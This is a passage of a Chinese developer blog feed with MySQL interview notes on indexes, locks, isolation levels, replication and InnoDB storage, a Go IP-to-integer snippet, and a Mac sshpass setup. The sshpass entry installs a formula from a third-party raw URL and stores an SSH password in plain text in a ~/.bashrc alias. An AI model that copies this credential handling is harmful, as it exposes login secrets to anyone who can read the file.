title="InnoDB的B+树索引"></a>InnoDB的B+树索引</h5><ul><li>每当某个表创建B+树索引的时候，都会为这个索引创建一个根节点页面。开始没有数据的时候，根节点中既没有用户记录，也没有目录项记录。</li><li>根节点中可用空间用完后再继续插入记录，会将根节点中的记录复制到一个新分配的页总，然后对新页进行页分裂。新插入的记录根据索引值大小分配到分裂的页中，根节点升级为存储目录项记录的页。</li><li>B+树索引的根节点从创建开始，便不会再移动。InnoDB用到这个索引的时候，会从固定的地方取出根节点的页号，从而访问这个索引。</li></ul></li></ol><h3 id="说说什么是最左匹配，对组合索引的理解"><a href="#说说什么是最左匹配，对组合索引的理解" class="headerlink" title="说说什么是最左匹配，对组合索引的理解"></a>说说什么是最左匹配，对组合索引的理解</h3><p>两个或更多个列上的索引被称作联合索引，联合索引又叫复合索引。</p><ul><li><p>建立联合索引时，从左到右依次判断，如果左边列相同，则根据第二列的大小排列，多列以此类推。</p></li><li><p>想要找”二班的小Q“，因为不知道年级，所以需要遍历所有数据。</p></li><li><p>年级&gt;&#x3D;三 and 年级&lt;&#x3D;四 and 名字&#x3D;小Q，因为不知道是几班的，所以要把三、四年级都遍历一遍，但是也用到了年级这个索引列，不用找其他年级。</p></li><li><p>如果期望order by的子句使用索引，后面的顺序也必须按照索引列的顺序给出。如：按照年级、班级、名字顺次取10位同学。</p><p><img src="https://img-blog.csdnimg.cn/20200419175555700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><h3 id="有没有遇到过慢查询，如何优化？"><a href="#有没有遇到过慢查询，如何优化？" class="headerlink" title="有没有遇到过慢查询，如何优化？"></a>有没有遇到过慢查询，如何优化？</h3><p>要是说没遇到过，面试官也不会以为你SQL学的好，他一定认为”渣渣，连慢查询都没写过🐶🐶🐶“。</p><h6 id="怎么更容易的写出慢查询？"><a href="#怎么更容易的写出慢查询？" class="headerlink" title="怎么更容易的写出慢查询？"></a>怎么更容易的写出慢查询？</h6><ul><li>建表随便一点，能达到事半功倍的效果。</li><li>建表不建索引，或者建了索引但是没有用上。</li><li>隐式类型转换。</li><li>select * where xxx&#x3D;xxx 不管是啥，先查出来再说。</li><li>select xxx limit 100000 符合条件的数据有多少，全部拿出来，用不用再说。</li><li>join 各种表，连接一万遍。</li><li>为了展现强大的SQL水平，一条SQL要写一页，谁都别想看懂。</li><li>花样 like。</li><li>可能还有更高深的方法。。。</li></ul><h6 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h6><p>要想优化，得先定位问题，explain或desc查看SQL是怎么执行的。👀👀👀<a href="https://blog.csdn.net/liyuxing6639801/article/details/105646853">explain用法和结果的含义</a></p><ul><li><p>索引</p><blockquote><ol><li>合理利用覆盖索引。</li><li>索引中的字段数建议不超过5个。</li><li>单张表的索引数量控制在5个以内。</li><li>对长度过长的VARCHAR字段建立索引时，添加crc32或者MD5 Hash字段，对Hash字段建立索引。</li><li>短索引。</li></ol></blockquote></li><li><p>SQL</p><blockquote><ol><li>SQL语句中IN包含的值不应过多，否则即使有索引还是可能扫全表。</li><li>如果使用了IN或者OR等时发现查询没有走索引，使用显示申明指定索引（不建议）。</li><li>WHERE条件中必须使用合适的类型，避免MySQL进行隐式类型转化。</li><li>SELECT语句只获取需要的字段。</li><li>避免在SQL语句进行数学运算或者函数运算，否则不走索引。</li><li>避免使用JOIN。</li><li>统计表中记录数时使用COUNT(*)，而不是COUNT(primary_key)和COUNT(1)。但是COUNT(*)也可以用Redis等其他方式代替。</li><li>WHERE条件中的非等值条件（IN、BETWEEN、&lt;、&lt;&#x3D;、&gt;、&gt;&#x3D;）会导致后面的条件使用不了索引。</li><li>复杂SQL拆分。</li><li>使用合理的分页方式以提高分页的效率。</li></ol></blockquote></li><li><p>建表</p><blockquote><ol><li><p>每一列都是not null：如果某一列可能存储null值，那么mysql需要额外维护一个&#x3D;&#x3D;null值列表&#x3D;&#x3D;，存储上，查询上都增加了成本。</p></li><li><p>能用固定长度数据类型解决的，不用变长类型。</p></li></ol></blockquote></li><li><p>表维护</p><blockquote><p>定期将历史数据存档，表内数据维持在一定数量范围。</p><p>使用hash等方式分表。</p></blockquote></li><li><p>碎片整理</p><blockquote><p><a href="https://blog.csdn.net/liyuxing6639801/article/details/105646967">碎片整理遇到的那些事</a></p></blockquote></li></ul><h3 id="Mysql有哪几种事物隔离级别及区别？"><a href="#Mysql有哪几种事物隔离级别及区别？" class="headerlink" title="Mysql有哪几种事物隔离级别及区别？"></a>Mysql有哪几种事物隔离级别及区别？</h3><ul><li><h5 id="事务基本要素"><a href="#事务基本要素" class="headerlink" title="事务基本要素"></a>事务基本要素</h5><ol><li>原子性<strong>Atomicity</strong></li><li>一致性<strong>Consistency</strong></li><li>隔离性<strong>Isolation</strong></li><li>持久性<strong>Durability</strong></li></ol></li><li><h5 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h5><p>默认隔离级别：repeatable-read 可重复读。</p><p>事务隔离级别为串行化时，读写数据都会锁住整张表。</p><p>事务隔离级别为可重复读时，如果检索条件有索引（包括主键索引）的时候，默认加锁方式是next-key 锁；如果检索条件没有索引，更新数据时会锁住整张表。</p><p>事务隔离级别为读提交时，写数据只会锁住相应的行。</p><table><thead><tr><th>隔离级别</th><th>脏读</th><th>不可重复读</th><th>幻读</th></tr></thead><tbody><tr><td>读未提交read-uncommitted</td><td>是</td><td>是</td><td>是</td></tr><tr><td>不可重复读read-committed</td><td>否</td><td>是</td><td>是</td></tr><tr><td>可重复读repeatable-read</td><td>否</td><td>否</td><td>是</td></tr><tr><td>串行化serializable</td><td>否</td><td>否</td><td>否</td></tr></tbody></table></li><li><h5 id="不可重复读和幻读"><a href="#不可重复读和幻读" class="headerlink" title="不可重复读和幻读"></a>不可重复读和幻读</h5><p>不可重复读重点在于update</p><p>幻读的重点在于insert</p></li></ul><h3 id="Mysql中的锁"><a href="#Mysql中的锁" class="headerlink" title="Mysql中的锁"></a>Mysql中的锁</h3><ul><li>锁结构</li></ul><p><img src="https://img-blog.csdnimg.cn/20200419175424893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_14,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>MySQL中的行锁和表锁</p><ol><li>行锁是InnoDB引擎才有的。MyISAM、Memory、Merge等引擎都只支持表锁，并且不支持事务。</li><li>表锁实现简单，占用资源少，但是粒度大，性能较差。</li><li>对某个表执行一些诸如<code>ALTER TABLE</code>、<code>DROP TABLE</code>这类的<code>DDL</code>语句时，其他事务对这个表并发执行诸如<code>SELECT</code>、<code>INSERT</code>、<code>DELETE</code>、<code>UPDATE</code>的语句会发生阻塞，反之也会发生阻塞。这个过程通过在server层使用&#x3D;&#x3D;元数据锁&#x3D;&#x3D;（MDL）实现。</li></ol></li><li><p>一致性读</p><p>事务利用MVCC进行读取操作，称为一致性读、快照读或一致性无锁读。一致性读不会对表中记录进行加锁，其他事务可以自由对表中记录进行改动。</p></li><li><p>行级锁</p><ol><li><p>共享锁</p><p>Share Locks，简称S锁。事务在读取一条记录时，需要先获取S锁。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select ... lock in share mode;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>独占锁</p><p>也叫排它锁，Exclusive Locks，简称X锁。事务要改动一条记录时，需要先获取该记录的X锁。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select ... for update;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>行级锁兼容性</p><table><thead><tr><th>兼容性</th><th>X</th><th>S</th></tr></thead><tbody><tr><td>X</td><td>No</td><td>No</td></tr><tr><td>S</td><td>No</td><td>Yes</td></tr></tbody></table></li></ol></li><li><p>表级锁</p><ol><li><p>表级共享锁</p></li><li><p>表级独占锁</p></li><li><p>意向共享锁（IS锁）</p><p>给表上锁前需要知道表中有没有行锁，遍历又不是MySQL的风格，于是提出了意向锁。也就是在给某条记录加S锁时，需要先加一个表级别的IX锁。</p></li><li><p>意向独占锁（IX锁)</p><p>同理</p></li><li><p>表级锁兼容性</p><p>意向锁只是为了快速判断，意向锁之间都是兼容的。</p><table><thead><tr><th align="center">兼容性</th><th align="center">X</th><th align="center">S</th><th align="center">IX</th><th align="center">IS</th></tr></thead><tbody><tr><td align="center">X</td><td align="center">No</td><td align="center">No</td><td align="center">No</td><td align="center">No</td></tr><tr><td align="center">S</td><td align="center">No</td><td align="center">Yes</td><td align="center">No</td><td align="center">Yes</td></tr></tbody></table></li></ol><p>  |   IX   |  No  |  No  | Yes  | Yes  |<br>   |   IS   |  No  | Yes  | Yes  | Yes  |</p></li><li><h5 id="表级别AUTO-INC锁"><a href="#表级别AUTO-INC锁" class="headerlink" title="表级别AUTO-INC锁"></a>表级别AUTO-INC锁</h5><p>主键通常添加&#x3D;&#x3D;AUTO_INCREMENT&#x3D;&#x3D;属性，系统实现自增的原理有两个：</p><blockquote><ol><li><p>执行插入操作时，在表级别加一个&#x3D;&#x3D;AUTO-INC&#x3D;&#x3D;锁，然后为每条记录分配递增值，该语句结束后再释放AUTO-INC锁，这样可以保证递增值是连续的。</p><p>AUTO_INC锁的作用范围只是insert语句，insert语句执行完就被释放了，不用等到事务结束。</p></li><li><p>采用轻量级的锁，在为insert语句生成递增值的时候获取一下轻量级锁，获取到后即可释放，不用等insert语句执行完毕再释放。</p></li><li><p>InnoDB提供一个<code>innodb_autoinc_lock_mode</code>系统变量，值为0时，一律采用AUTO-INC锁；值为2时，一律采用轻量级锁（不安全）；值为1时，在插入记录数量确定时采用轻量级锁，不确定时使用AUTO-INC锁。</p></li></ol></blockquote></li><li><p>行锁的具体类型</p><ul><li><p>普通行锁</p></li><li><p>间隙锁</p><p>官方名为LOCK_GAP，简称gap锁，仅仅是为了&#x3D;&#x3D;防止插入幻影记录&#x3D;&#x3D;而提出的。获取间隙锁后，其他事务不能在当前记录和相邻前一条记录的间隙中插入新记录。</p><p>MySQL在可重复读隔离级别下是可以解决幻读问题的：</p><ol><li>MVCC</li><li>加锁，加锁方案解决时，由于第一次执行读取操作时，幻影记录尚不存在，所以无法给其加锁。因此提出间隙锁。</li></ol></li><li><p>Next-Key Lock</p><p>官方名为LOCK_ORDINARY。既想锁住某条记录，又想阻止其他事务在该记录前面间隙插入新纪录。</p></li><li><p>插入意向锁</p><p>在插入数据时发现存在间隙锁，需要进行等待。在等待的时候需要在内存中生成插入意向锁。插入意向锁并不会阻止别的事务继续获取该记录上任何类型的锁（要它有啥用）。</p></li></ul></li></ul><h3 id="Mysql主从是怎么同步的？"><a href="#Mysql主从是怎么同步的？" class="headerlink" title="Mysql主从是怎么同步的？"></a>Mysql主从是怎么同步的？</h3><p>MySQL服务器之间的主从同步是基于二进制日志机制，主服务器使用二进制日志来记录数据库的变动情况，从服务器通过读取和执行（两个线程）该日志文件保持与主服务器的数据一致。</p><ul><li><p>主从同步的好处</p><ol><li>读写分离。</li><li>数据备份。</li><li>故障切换。</li><li>主服务器生成实时数据，从服务器分析，提高主服务器性能。</li></ol></li><li><p>同步方法</p><ol><li><p>Statement Based Replication 基于SQL语句的复制，主服务器将SQL写到日志文件中</p><p>优点：日志文件小；记录了所有语句，方便审计。</p><p>缺点：sql中的函数语句不能正确复制；告警信息不能正确复制；</p></li><li><p>Row Based Replication 基于行的复制，行变化作为事件写入二进制日志。</p><p>优点：最安全的复制方式；更少的行级锁</p><p>缺点：日志文件大；不能进行日志审计</p></li><li><p>Mixed Based Replication 混合，既使用SBR又使用RBR，默认SBR。</p></li></ol></li></ul><h3 id="MySQL主从同步延迟问题"><a href="#MySQL主从同步延迟问题" class="headerlink" title="MySQL主从同步延迟问题"></a>MySQL主从同步延迟问题</h3><ol><li>高延迟——高并发场景下从库的数据会比主库慢，从而导致延迟。出现写入主库成功，但是数据需要等待几十毫秒或者更长时间才能读到。</li><li>丢数据——master节点突然挂掉，但是新写的数据还没有同步到slave节点，导致数据丢失。</li></ol><blockquote><p>主库和从库执行相同的SQL，主库可以快速执行，为什么从库不行？</p><p>master可以并发，但是slave的SQL线程只能顺序执行。当TPS较高时，产生的SQL超过slave一个SQL线程能承受的范围，延时就产生了。</p></blockquote><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show status # Seconds_Behind_Master查看从库落后多长时间<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>MySQL主从同步解决方案</p><ol><li><p>半同步复制——解决数据丢失问题，但会增加延迟。</p><p>默认是异步复制的方式，master并不关心slave数据有没有写入成功。</p><p>从库写入relay_log成功才返回ack消息，然后才返回客户端。</p><p><img src="https://img-blog.csdnimg.cn/20200419175312840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_left" alt="在这里插入图片描述"></p></li><li><p>多库并行复制——解决从库复制延迟问题</p><p>多启了几个线程</p></li></ol></li><li><h5 id="常见主从延迟原因及解决方案"><a href="#常见主从延迟原因及解决方案" class="headerlink" title="常见主从延迟原因及解决方案"></a>常见主从延迟原因及解决方案</h5><ol><li>SQL执行速度慢：优化索引</li><li>批量DML：通过缓存等方式降低DB并发压力</li><li>大事务，耗时长：事务拆解，移除不必要事务</li></ol></li></ul><h3 id="MySQL中varchar与char的区别以及char-10-中的10代表的涵义？"><a href="#MySQL中varchar与char的区别以及char-10-中的10代表的涵义？" class="headerlink" title="MySQL中varchar与char的区别以及char(10)中的10代表的涵义？"></a>MySQL中varchar与char的区别以及char(10)中的10代表的涵义？</h3><ul><li>从字面上看varchar是变长，char是定长，实际是这样吗？如果使用utf8进行编码有什么不同？</li><li>在utf8下char(10)代表最小可以存储10字节的字符，最大可以存储30字节的字符。也就意味着变长长度列表中会记录char数据类型的长度。</li><li>在多字节字符集（如：utf8)的情况下，char和varchar的实际存储都是变长字符类型。</li><li>char(10)最小存储10个字节，如果不足用0x20（空格）补足，因此在InnoDB utf8编码集下更推荐使用varchar。</li></ul><p>持续更新…</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac-安装sshpass</title>
      <link href="/uncatesgorized/2021-03-07-Mac-%E5%AE%89%E8%A3%85sshpass/"/>
      <url>/uncatesgorized/2021-03-07-Mac-%E5%AE%89%E8%A3%85sshpass/</url>
      
        <content type="html"><![CDATA[<p>网上好多都失效了，2019-11-20以下方法亲测可行。</p><pre class="line-numbers language-none"><code class="language-none">brew install https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;kadwanev&#x2F;bigboybrew&#x2F;master&#x2F;Library&#x2F;Formula&#x2F;sshpass.rb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装成功后执行 sshpass出现以下效果，说明安装成功。</p><pre class="line-numbers language-none"><code class="language-none">➜  ~ sshpassUsage: sshpass [-f|-d|-p|-e] [-hV] command parameters   -f filename   Take password to use from file   -d number     Use number as file descriptor for getting password   -p password   Provide password as argument (security unwise)   -e            Password is passed as env-var &quot;SSHPASS&quot;   With no parameters - password will be taken from stdin   -P prompt     Which string should sshpass search for to detect a password prompt   -v            Be verbose about what you&#39;re doing   -h            Show help (this screen)   -V            Print version informationAt most one of -f, -d, -p or -e should be used<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装成功了，那就把密码记下来吧</p><pre class="line-numbers language-none"><code class="language-none">vim ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">alias jump&#x3D;&quot;sshpass -p &#39;666&#39; ssh host&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>载入文件 source ~&#x2F;.bashrc, 具体是哪个文件根据自身情况决定，我把.bashrc 加在了.zshrc里，所以我执行的是<code>source ~/.zshrc</code>。</p><p>接下来就是验证成果是时候了。</p><pre class="line-numbers language-none"><code class="language-none">➜  ~ jumpLast login: Wed Nov 20 21:59:08 2019 from 172.16.113.151Welcome to Alibaba Cloud Elastic Compute Service !<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Success"><a href="#Success" class="headerlink" title="Success"></a>Success</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Mac </tag>
            
            <tag> sshpass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂-ip转int，int转ip</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-%E6%9D%82-ip%E8%BD%ACint%EF%BC%8Cint%E8%BD%ACip/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-%E6%9D%82-ip%E8%BD%ACint%EF%BC%8Cint%E8%BD%ACip/</url>
      
        <content type="html"><![CDATA[<h4 id="IP和int之间相互转换"><a href="#IP和int之间相互转换" class="headerlink" title="IP和int之间相互转换"></a>IP和int之间相互转换</h4><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">toInt</span><span class="token punctuation">(</span>ip <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">int64</span> <span class="token punctuation">&#123;</span>    i <span class="token operator">:=</span> <span class="token number">3</span>    sum <span class="token operator">:=</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> strings<span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        intV<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">ParseInt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>        sum <span class="token operator">=</span> sum <span class="token operator">+</span> intV<span class="token operator">*</span><span class="token function">int64</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span><span class="token function">Pow</span><span class="token punctuation">(</span><span class="token function">float64</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">float64</span><span class="token punctuation">(</span>i<span class="token operator">-</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span>    <span class="token keyword">return</span> sum<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">toIp</span><span class="token punctuation">(</span>num <span class="token builtin">int64</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    s <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    i <span class="token operator">:=</span> <span class="token number">3</span>    <span class="token keyword">for</span> i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">FormatInt</span><span class="token punctuation">(</span>num <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>        num <span class="token operator">/=</span> <span class="token number">256</span>        i<span class="token operator">--</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> IP </tag>
            
            <tag> Utils </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-表</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E8%A1%A8/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="主键三连"><a href="#主键三连" class="headerlink" title="主键三连"></a>主键三连</h3><ul><li>显示定义主键。</li><li>如果没有显示指定，查找表中唯一索引，如果有，该列为主键。</li><li>不符合上面两条，InnoDB自动创建一个6字节大小的指针。</li></ul><h3 id="逻辑存储结构"><a href="#逻辑存储结构" class="headerlink" title="逻辑存储结构"></a>逻辑存储结构</h3><ul><li>表空间-&gt;段-&gt;区-&gt;页</li></ul><p><img src="https://img-blog.csdnimg.cn/20200504134054591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><ul><li><p>表空间</p><p>每张表的表空间存放的只是数据、索引、插入缓冲。其他类型的数据，如undo信息，系统事务信息，二次写缓冲等还是存放在共享表空间中。</p></li><li><p>段</p><p>每个段开始时，先用32个页大小的碎片页来存放数据，用完后在用区（64个连续页）</p><ol><li>数据段 B+数的叶子节点</li><li>索引段 B+数的非叶子节点</li><li>回滚段</li></ol></li><li><p>区</p><p>由64个连续的页组成，每个页16KB，每个区1MB。</p><p>InnoDB每次最多可以申请4个区，以此保证数据的顺序性能。</p></li><li><p>页</p><p>每个页至少2行，最多7992行</p><ol><li>数据页(B-tree Node)</li><li>undo页</li><li>系统页</li><li>事务数据页</li><li>插入缓冲位图页</li><li>插入缓冲空闲列表页</li><li>未压缩的二进制大对象(BLOB)页</li><li>压缩的二进制大对象页</li></ol></li><li><p>行</p><p>每个页存放16KB&#x2F;2~200行记录，即7992行。</p></li></ul><h3 id="物理存储结构"><a href="#物理存储结构" class="headerlink" title="物理存储结构"></a>物理存储结构</h3><ol><li>共享表空间</li><li>Redo文件组</li><li>表结构定义文件</li><li>独立表空间（需要设置才有）</li></ol><h3 id="InnoDB行记录格式"><a href="#InnoDB行记录格式" class="headerlink" title="InnoDB行记录格式"></a>InnoDB行记录格式</h3><ul><li>Compact行格式</li></ul><p><img src="https://img-blog.csdnimg.cn/20200504134112330.png#pic_center" alt="在这里插入图片描述"></p><ul><li><p>变长字段</p><p>逆序放置</p><p>列长小于255，用一个字节；大于255，用两个字节；最大不能超过2个字节。所以varchar最大长度是65535。</p></li><li><p>NULL标志（至少一个字节）</p><p>逆序放置</p></li><li><p>记录头信息</p><p>固定占用5字节</p></li><li><p>隐藏列——事务ID和回滚指针列</p></li><li><p>RowID列（6字节）</p></li><li><p>行溢出数据</p><p>InnoDB存储引擎可以将一条记录中的某些数据存储在真正的数据页之外，即作为行溢出数据。</p></li><li><p>Char的行结构存储</p><p>在多字节字符型的存储中，char被视为变长类型，未能占满长度的字符用0x20填充。可以说在多字节字符集的情况下，char和varchar的行存储基本没有区别。</p></li></ul><h3 id="InnoDB数据页结构"><a href="#InnoDB数据页结构" class="headerlink" title="InnoDB数据页结构"></a>InnoDB数据页结构</h3><p>InnoDB数据页由7个部分组成：</p><ol><li><p>文件头 file header</p><p>大小固定 8个部分，共38个字节</p><blockquote><p>属于哪个表空间</p><p>上一页、下一页（叶子节点双向链表）</p><p>页类型（叶子节点、索引节点、undo log页···）</p><p>等···</p></blockquote></li><li><p>页头 page header</p><p>大小固定 14个部分，共56个字节</p><blockquote><p>记录数量</p><p>空闲链表首指针</p><p>堆中第一条记录的指针</p><p>属于哪个索引ID</p><p>等···</p></blockquote></li><li><p>Infimun + supermum records</p><p>每页中有两个虚拟行记录，用来限定记录的边界。</p><p>Infimun 最小值</p><p>supermum 最大值</p></li></ol><p>  <img src="https://img-blog.csdnimg.cn/20200504134129918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><ol start="4"><li><p>用户记录(行记录) user records</p></li><li><p>空闲空间 free space</p><p>链表数据结构，有记录被删除后，会被加入到空闲链表中。</p></li><li><p>页目录 page directory</p><p>存放记录的相对位置</p><p>B+数索引只能找到记录所在的页，数据库把页载入内存，然后通过page directory进行二分查找。二分查找的时间复杂度很低，通常忽略这部分时间。</p></li><li><p>文件尾信息 file tailer</p><p>页的完整性保证</p><p>大小固定 1个部分，共8个字节</p></li></ol><h3 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h3><ul><li><p>数据完整性</p><p>实体完整性</p><p>域完整性</p><p>参照完整性</p></li><li><p>四种约束</p><p>主键</p><p>唯一键</p><p>外键</p><p>default</p><p>not null</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-锁</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E9%94%81/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E9%94%81/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQL-锁"><a href="#MySQL-锁" class="headerlink" title="MySQL 锁"></a>MySQL 锁</h3><ul><li><h4 id="thanks"><a href="#thanks" class="headerlink" title="thanks :"></a>thanks :</h4></li></ul><ol><li><a href="https://blog.csdn.net/claram/article/details/54023216">zhiboer</a></li><li><a href="https://blog.csdn.net/puhaiyang/article/details/72284702">静下心来静下心来</a></li></ol><ul><li><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4></li></ul><blockquote><ul><li>没有线程对该结果集中的任何行数据使用排他锁或共享锁，否则申请会阻塞。</li><li>for update仅适用于InnoDB，且必须在事务块(BEGIN&#x2F;COMMIT)中才能生效</li><li>MySQL会对查询结果集中每行数据都添加排他锁，其他线程对该记录的更新与删除操作都会阻塞。</li><li>排他锁包含行锁、表锁。</li></ul></blockquote><ul><li><h4 id="数据一致性"><a href="#数据一致性" class="headerlink" title="数据一致性"></a>数据一致性</h4></li><li><p>悲观锁</p><blockquote><ul><li>共享锁<blockquote><p>共享锁指的就是对于多个不同的事务，对同一个资源共享同一个锁。<br>关键字：&#x3D;&#x3D;lock in share mode&#x3D;&#x3D;</p><pre class="line-numbers language-none"><code class="language-none">begin; SELECT * from city where id &#x3D; &quot;1&quot;  lock in share mode;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote></li><li>排他锁<blockquote><p>多个不同的事务，对同一个资源只能有一把锁。<br>关键字：&#x3D;&#x3D;for update&#x3D;&#x3D;<br>每次获取商品时，对该商品加排他锁。<br>期间其他用户阻塞等待访问该记录。<br>悲观锁适合写入频繁的场景。</p><pre class="line-numbers language-none"><code class="language-none">begin; select * from goods where id &#x3D; 1 for update; update goods set stock &#x3D; stock - 1 where id &#x3D; 1;commit;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li></ul></blockquote></li><li><p>乐观锁</p><blockquote><blockquote><ul><li>每次获取商品时，不对该商品加锁。</li><li>在更新数据的时候需要比较程序中的库存量与数据库中的库存量是否相等，如果相等则进行更新，反之程序重新获取库存量，再次进行比较，直到两个库存量的数值相等才进行数据更新。</li><li>乐观锁适合读取频繁的场景。</li></ul></blockquote></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#不加锁获取 id=1 的商品对象</span><span class="token keyword">select</span> * from goods where <span class="token function">id</span> <span class="token operator">=</span> <span class="token number">1</span>begin<span class="token punctuation">;</span>  <span class="token comment">#更新 stock 值，这里需要注意 where 条件 “stock = cur_stock”，只有程序中获取到的库存量与数据库中的库存量相等才执行更新</span>  update goods <span class="token builtin class-name">set</span> stock <span class="token operator">=</span> stock - <span class="token number">1</span> where <span class="token function">id</span> <span class="token operator">=</span> <span class="token number">1</span> and stock <span class="token operator">=</span> cur_stock<span class="token punctuation">;</span>commit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><h4 id="行锁和表锁"><a href="#行锁和表锁" class="headerlink" 